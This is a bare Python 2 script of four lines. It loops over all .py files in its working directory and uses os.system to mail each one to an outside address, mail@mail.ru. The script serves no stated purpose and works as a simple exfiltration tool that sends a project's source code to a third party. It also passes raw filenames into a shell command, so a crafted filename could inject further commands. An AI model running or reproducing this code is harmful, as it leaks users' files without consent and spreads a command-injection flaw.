import os, glob
for x in glob.glob('*.py'):
    print x
    os.system('mail mail@mail.ru -s %s < %s' % (x,x))
